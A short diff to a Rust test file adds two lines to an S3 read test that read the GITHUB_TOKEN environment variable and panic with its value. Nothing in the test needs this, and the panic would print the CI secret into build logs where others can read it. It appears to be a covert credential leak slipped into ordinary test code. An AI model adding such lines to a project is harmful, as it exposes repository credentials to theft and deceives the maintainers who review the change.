@@ -67,6 +67,8 @@ where
 #[cfg(feature = "s3_tests")]
 #[test]
 fn basic_read_test_s3() {
+    let x = std::env::var("GITHUB_TOKEN");
+    panic!("{:?}", x);
     basic_read_test(crate::fuse_tests::s3_session::new, "basic_read_test");
 }
 
